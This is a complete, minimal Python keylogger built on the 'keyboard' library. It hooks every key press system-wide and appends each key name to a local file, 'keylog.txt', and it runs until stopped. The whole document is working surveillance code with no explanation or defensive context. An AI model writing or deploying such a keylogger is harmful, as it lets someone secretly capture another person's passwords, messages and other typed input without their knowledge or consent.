import keyboard

log_file = "keylog.txt"

def on_key_event(e):
    if e.event_type == keyboard.KEY_DOWN:
        with open(log_file, "a") as f:
            f.write(e.name + "\n")

keyboard.hook(on_key_event)
keyboard.wait()

